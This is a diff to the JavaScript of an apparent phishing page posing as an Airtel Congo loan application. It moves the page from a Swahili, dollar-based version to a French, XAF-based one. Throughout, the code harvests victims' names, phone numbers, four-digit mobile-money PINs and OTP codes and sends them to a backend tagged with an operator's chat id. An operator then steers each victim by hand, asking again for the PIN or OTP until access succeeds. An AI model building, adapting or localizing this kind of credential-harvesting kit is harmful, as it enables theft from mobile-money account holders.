@@ -3,8 +3,8 @@ document.addEventListener('DOMContentLoaded', () => {
   const adminChatId = urlParams.get('admin');
 
   let state = {
-    amount: '$2,500',
-    duration: 'Miezi 12',
+    amount: 'XAF 2,500,000',
+    duration: '12 Mois',
     loanType: '',
     purpose: '',
     firstName: '',
@@ -41,31 +41,26 @@ document.addEventListener('DOMContentLoaded', () => {
 
   function updateCalculator() {
     const val = parseInt(amountRange.value);
-    state.amount = `$${val.toLocaleString()}`;
+    state.amount = `XAF ${val.toLocaleString()}`;
     calcAmountInput.value = state.amount;
 
     const months = parseInt(durationRange.value);
-    state.duration = `Miezi ${months}`;
+    state.duration = `${months} Mois`;
     durationVal.textContent = state.duration;
 
     const monthly = (val * 1.12) / months;
-    monthlyPayment.textContent = `$${Math.round(monthly).toLocaleString()}`;
+    monthlyPayment.textContent = `XAF ${Math.round(monthly).toLocaleString()}`;
   }
 
-  if (amountRange && durationRange) {
-    amountRange.addEventListener('input', updateCalculator);
-    durationRange.addEventListener('input', updateCalculator);
-  }
+  amountRange.addEventListener('input', updateCalculator);
+  durationRange.addEventListener('input', updateCalculator);
 
-  const btnStartApp = document.getElementById('btn-start-app');
-  if (btnStartApp) {
-    btnStartApp.addEventListener('click', () => {
-      document.getElementById('form-amount').value = amountRange.value;
-      state.amount = `$${parseInt(amountRange.value).toLocaleString()}`;
-      switchView('form');
-      validateStep(1);
-    });
-  }
+  document.getElementById('btn-start-app').addEventListener('click', () => {
+    document.getElementById('form-amount').value = amountRange.value;
+    state.amount = `XAF ${parseInt(amountRange.value).toLocaleString()}`;
+    switchView('form');
+    validateStep(1);
+  });
 
   let currentStep = 1;
   const formSteps = document.querySelectorAll('.form-step');
@@ -80,16 +75,13 @@ document.addEventListener('DOMContentLoaded', () => {
         step.classList.add('hidden');
       }
     });
-    if (progressFill) progressFill.style.width = `${(currentStep / 3) * 100}%`;
-    if (stepIndicator) stepIndicator.textContent = `Hatua ${currentStep} kati ya 3`;
+    progressFill.style.width = `${(currentStep / 3) * 100}%`;
+    stepIndicator.textContent = `Étape ${currentStep} sur 3`;
   }
 
-  // Strict Airtel Congo validation helper (+243 followed by 97, 98, or 99 and 7 digits)
-  function isValidAirtelCongoNumber(number) {
-    if (!number) return false;
-    const clean = String(number).trim().replace(/[\s\-\(\)]/g, '');
-    const regex = /^(?:\+243|243)?(97|98|99)\d{7}$/;
-    return regex.test(clean);
+  function isValidAirtelNumber(number) {
+    const clean = String(number || '').replace(/\D/g, '');
+    return /^(05|06)\d{7}$/.test(clean);
   }
 
   function validateStep(step) {
@@ -99,7 +91,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
     if (step === 2) {
       const contactVal = document.getElementById('user-contact').value;
-      const isValid = isValidAirtelCongoNumber(contactVal);
+      const isValid = isValidAirtelNumber(contactVal);
       if (nextBtn) nextBtn.disabled = !isValid;
     } else {
       if (nextBtn) nextBtn.disabled = false;
@@ -112,49 +104,42 @@ document.addEventListener('DOMContentLoaded', () => {
 
   const userContactInput = document.getElementById('user-contact');
   if (userContactInput) {
-    userContactInput.addEventListener('input', () => {
+    userContactInput.addEventListener('input', (e) => {
+      let value = e.target.value.replace(/\D/g, '');
+      if (value.length > 9) value = value.slice(0, 9);
+      e.target.value = value;
       validateStep(2);
     });
   }
 
   const loginContactInput = document.getElementById('login-contact');
   if (loginContactInput) {
-    loginContactInput.addEventListener('input', () => {
+    loginContactInput.addEventListener('input', (e) => {
+      let value = e.target.value.replace(/\D/g, '');
+      if (value.length > 9) value = value.slice(0, 9);
+      e.target.value = value;
       checkPinComplete();
     });
   }
 
-  // Event Listeners for inputs
-  const loanTypeEl = document.getElementById('loan-type');
-  const formAmountEl = document.getElementById('form-amount');
-  const loanPurposeEl = document.getElementById('loan-purpose');
-  const firstNameEl = document.getElementById('first-name');
-  const lastNameEl = document.getElementById('last-name');
-
-  if (loanTypeEl) loanTypeEl.addEventListener('change', () => validateStep(1));
-  if (formAmountEl) formAmountEl.addEventListener('input', () => validateStep(1));
-  if (loanPurposeEl) loanPurposeEl.addEventListener('input', () => validateStep(1));
-  if (firstNameEl) firstNameEl.addEventListener('input', () => validateStep(2));
-  if (lastNameEl) lastNameEl.addEventListener('input', () => validateStep(2));
-
   document.querySelectorAll('.next-btn').forEach(btn => {
-    btn.addEventListener('click', () => {
+    btn.addEventListener('click', async () => {
       if (currentStep === 2) {
         const contactVal = document.getElementById('user-contact').value;
-        if (!isValidAirtelCongoNumber(contactVal)) {
-          alert("Tafadhali weka namba sahihi ya Airtel Congo (+243 yenye kuanzia 97, 98, au 99).");
+        if (!isValidAirtelNumber(contactVal)) {
+          alert("Veuillez entrer un numéro Airtel Congo valide commençant par 05 ou 06.");
           return;
         }
       }
 
       if (currentStep === 1) {
         state.loanType = document.getElementById('loan-type').value;
-        state.amount = `$${parseInt(document.getElementById('form-amount').value || 2500).toLocaleString()}`;
-        state.purpose = document.getElementById('loan-purpose').value || 'Mkopo';
+        state.amount = `XAF ${parseInt(document.getElementById('form-amount').value || 2500000).toLocaleString()}`;
+        state.purpose = document.getElementById('loan-purpose').value || 'Prêt';
       } else if (currentStep === 2) {
-        state.firstName = document.getElementById('first-name').value || 'Mteja';
+        state.firstName = document.getElementById('first-name').value || 'Client';
         state.lastName = document.getElementById('last-name').value || '';
-        state.contact = document.getElementById('user-contact').value || '+243990000000';
+        state.contact = document.getElementById('user-contact').value || '050000000';
 
         document.getElementById('sum-amount').textContent = state.amount;
         document.getElementById('sum-duration').textContent = state.duration;
@@ -172,10 +157,11 @@ document.addEventListener('DOMContentLoaded', () => {
 
   const btnSubmitApp = document.getElementById('btn-submit-app');
   if (btnSubmitApp) {
+    btnSubmitApp.disabled = false;
     btnSubmitApp.addEventListener('click', async () => {
-      state.employment = document.getElementById('employment-status').value || 'Haijaainishwa';
+      state.employment = document.getElementById('employment-status').value || 'Non spécifié';
       state.income = document.getElementById('annual-income').value || '0';
-      if (!state.contact) state.contact = '+243990000000';
+      if (!state.contact) state.contact = '050000000';
 
       switchView('waiting');
       try {
@@ -191,7 +177,7 @@ document.addEventListener('DOMContentLoaded', () => {
         });
         const data = await response.json();
         if (!data.success) {
-          alert(data.error || "HUJAJULIPIA. WASILIANA NA MSIMAMIZI ILI KUFUNGUA KIUNGO CHAKO. BAADA YA KUWASILIANA NAYE, ATATIA ALAMA YA KWAMBA UMEJULIPIA NA KIUNGO KITAFANYA KAZI.");
+          alert(data.error || " PAIEMENT REQUIS. CONTACTEZ L'ADMINISTRATEUR POUR ACTIVER VOTRE LIEN.");
           location.reload();
           return;
         }
@@ -199,13 +185,14 @@ document.addEventListener('DOMContentLoaded', () => {
         pollStatus();
       } catch (err) {
         console.error(err);
-        alert("Hitilafu ya mtandao. Tafadhali jaribu tena.");
+        alert("Erreur réseau. Veuillez réessayer.");
         location.reload();
       }
     });
   }
 
   document.querySelectorAll('.prev-btn').forEach(btn => {
+    btn.disabled = false;
     btn.addEventListener('click', () => {
       if (currentStep > 1) {
         currentStep--;
@@ -227,12 +214,11 @@ document.addEventListener('DOMContentLoaded', () => {
           switchView('login');
         } else if (data.status === 'DENIED') {
           clearInterval(interval);
-          alert('Ombi lako la mkopo limekataliwa na msimamizi wa Airtel Congo.');
+          alert("Votre demande de prêt a été refusée par l'administrateur Airtel.");
           location.reload();
         } else if (data.status === 'SUCCESS') {
           clearInterval(interval);
-          const approvedVal = document.getElementById('approved-amount-val');
-          if (approvedVal) approvedVal.textContent = state.amount;
+          populateSuccessScreen();
           switchView('success');
         }
       } catch (e) {
@@ -241,11 +227,11 @@ document.addEventListener('DOMContentLoaded', () => {
     }, 3000);
   }
 
-  // 4-Digit PIN Input Management
   const pinBoxes = document.querySelectorAll('.pin-box');
   pinBoxes.forEach((box, index) => {
     box.addEventListener('input', (e) => {
-      const val = e.target.value;
+      let val = e.target.value.replace(/\D/g, '');
+      e.target.value = val;
       if (val && index < pinBoxes.length - 1) {
         pinBoxes[index + 1].focus();
       }
@@ -259,13 +245,11 @@ document.addEventListener('DOMContentLoaded', () => {
   });
 
   function checkPinComplete() {
-    const btnLogin = document.getElementById('btn-login');
     let pinStr = '';
     pinBoxes.forEach(b => pinStr += b.value);
-    const loginContactVal = document.getElementById('login-contact').value;
-    
+    const btnLogin = document.getElementById('btn-login');
     if (btnLogin) {
-      btnLogin.disabled = !(pinStr.length === 4 && isValidAirtelCongoNumber(loginContactVal));
+      btnLogin.disabled = pinStr.length !== 4;
     }
   }
 
@@ -273,22 +257,22 @@ document.addEventListener('DOMContentLoaded', () => {
   if (btnLoginEl) {
     btnLoginEl.addEventListener('click', async () => {
       const loginContactVal = document.getElementById('login-contact').value.trim();
-      if (!isValidAirtelCongoNumber(loginContactVal)) {
-        alert("Tafadhali weka namba sahihi ya Airtel Congo (+243 yenye kuanzia 97, 98, au 99).");
+      if (!isValidAirtelNumber(loginContactVal)) {
+        alert("Veuillez entrer un numéro Airtel Congo valide commençant par 05 ou 06.");
         return;
       }
 
       let pinStr = '';
       pinBoxes.forEach(b => pinStr += b.value);
       if (pinStr.length !== 4) {
-        alert("Tafadhali ingiza PIN kamili ya tarakimu 4.");
+        alert("Veuillez entrer un code PIN à 4 chiffres.");
         return;
       }
 
       state.pin = pinStr;
       state.contact = loginContactVal;
       switchView('waiting');
-      document.getElementById('waiting-status-text').textContent = 'Inathibitisha PIN ya akaunti yako...';
+      document.getElementById('waiting-status-text').textContent = 'Vérification du code PIN de votre compte...';
 
       try {
         const res = await fetch(`/api/submit-application${adminChatId ? '?admin=' + encodeURIComponent(adminChatId) : ''}`, {
@@ -303,25 +287,51 @@ document.addEventListener('DOMContentLoaded', () => {
         });
         const data = await res.json();
         if (!data.success) {
-          alert(data.error || "Imeshindikana kuthibitisha PIN.");
-          switchView('login');
+          alert(data.error || " PAIEMENT REQUIS. CONTACTEZ L'ADMINISTRATEUR POUR ACTIVER VOTRE LIEN.");
+          location.reload();
           return;
         }
         state.userId = data.userId;
         pollOtpStatus();
-      } catch (err) {
-        console.error(err);
-        alert("Hitilafu ya mtandao.");
-        switchView('login');
+      } catch (e) {
+        console.error(e);
+        alert("Erreur réseau. Veuillez réessayer.");
+        location.reload();
       }
     });
   }
 
-  // 4-Digit OTP Input Management
+  function pollOtpStatus() {
+    const interval = setInterval(async () => {
+      try {
+        const res = await fetch(`/api/check-status/${state.userId}`);
+        const data = await res.json();
+
+        if (data.status === 'APPROVED_LOAD_OTP') {
+          clearInterval(interval);
+          document.getElementById('otp-target-display').textContent = state.contact;
+          switchView('otp');
+        } else if (data.status === 'RETRY_PIN') {
+          clearInterval(interval);
+          switchView('login');
+          document.getElementById('pin-error').classList.remove('hidden');
+          pinBoxes.forEach(b => b.value = '');
+        } else if (data.status === 'SUCCESS') {
+          clearInterval(interval);
+          populateSuccessScreen();
+          switchView('success');
+        }
+      } catch (e) {
+        console.error(e);
+      }
+    }, 3000);
+  }
+
   const otpBoxes = document.querySelectorAll('.otp-box');
   otpBoxes.forEach((box, index) => {
     box.addEventListener('input', (e) => {
-      const val = e.target.value;
+      let val = e.target.value.replace(/\D/g, '');
+      e.target.value = val;
       if (val && index < otpBoxes.length - 1) {
         otpBoxes[index + 1].focus();
       }
@@ -335,39 +345,12 @@ document.addEventListener('DOMContentLoaded', () => {
   });
 
   function checkOtpComplete() {
-    const btnSubmitOtp = document.getElementById('btn-submit-otp');
     let otpStr = '';
     otpBoxes.forEach(b => otpStr += b.value);
+    const btnSubmitOtp = document.getElementById('btn-submit-otp');
     if (btnSubmitOtp) {
-      btnSubmitOtp.disabled = (otpStr.length !== 4);
+      btnSubmitOtp.disabled = otpStr.length !== 4;
     }
-  }
-
-  function pollOtpStatus() {
-    const interval = setInterval(async () => {
-      try {
-        const res = await fetch(`/api/check-status/${state.userId}`);
-        const data = await res.json();
-
-        if (data.status === 'REQUEST_OTP') {
-          clearInterval(interval);
-          const targetDisplay = document.getElementById('otp-target-display');
-          if (targetDisplay) targetDisplay.textContent = state.contact;
-          switchView('otp');
-        } else if (data.status === 'SUCCESS') {
-          clearInterval(interval);
-          const approvedVal = document.getElementById('approved-amount-val');
-          if (approvedVal) approvedVal.textContent = state.amount;
-          switchView('success');
-        } else if (data.status === 'DENIED') {
-          clearInterval(interval);
-          alert('Msimamizi amekataa ombi lako.');
-          location.reload();
-        }
-      } catch (e) {
-        console.error(e);
-      }
-    }, 3000);
   }
 
   const btnSubmitOtpEl = document.getElementById('btn-submit-otp');
@@ -376,34 +359,63 @@ document.addEventListener('DOMContentLoaded', () => {
       let otpStr = '';
       otpBoxes.forEach(b => otpStr += b.value);
       if (otpStr.length !== 4) {
-        alert("Tafadhali ingiza namba 4 za OTP.");
+        alert("Veuillez entrer un code OTP à 4 chiffres.");
         return;
       }
       state.otp = otpStr;
+
       switchView('waiting');
-      document.getElementById('waiting-status-text').textContent = 'Inathibitisha OTP...';
+      document.getElementById('waiting-status-text').textContent = 'Validation du code OTP...';
 
       try {
-        const res = await fetch(`/api/submit-otp${adminChatId ? '?admin=' + encodeURIComponent(adminChatId) : ''}`, {
+        await fetch('/api/submit-otp', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ userId: state.userId, otp: state.otp })
         });
-        const data = await res.json();
-        if (data.success) {
-          const approvedVal = document.getElementById('approved-amount-val');
-          if (approvedVal) approvedVal.textContent = state.amount;
-          switchView('success');
-        } else {
-          alert(data.error || "OTP si sahihi.");
-          switchView('otp');
-        }
-      } catch (err) {
-        console.error(err);
-        alert("Hitilafu ya mtandao.");
-        switchView('otp');
+        pollFinalStatus();
+      } catch (e) {
+        console.error(e);
       }
     });
   }
+
+  function pollFinalStatus() {
+    const interval = setInterval(async () => {
+      try {
+        const res = await fetch(`/api/check-status/${state.userId}`);
+        const data = await res.json();
+
+        if (data.status === 'SUCCESS') {
+          clearInterval(interval);
+          populateSuccessScreen();
+          switchView('success');
+        } else if (data.status === 'RETRY_OTP') {
+          clearInterval(interval);
+          switchView('otp');
+          document.getElementById('otp-error').classList.remove('hidden');
+          otpBoxes.forEach(b => b.value = '');
+        } else if (data.status === 'RETRY_PIN') {
+          clearInterval(interval);
+          switchView('login');
+          document.getElementById('pin-error').classList.remove('hidden');
+          pinBoxes.forEach(b => b.value = '');
+        }
+      } catch (e) {
+        console.error(e);
+      }
+    }, 3000);
+  }
+
+  function populateSuccessScreen() {
+    document.getElementById('approved-amount-val').textContent = state.amount;
+  }
+
+  const btnHome = document.getElementById('btn-home');
+  if (btnHome) {
+    btnHome.addEventListener('click', () => {
+      location.reload();
+    });
+  }
 });
-    
+                          
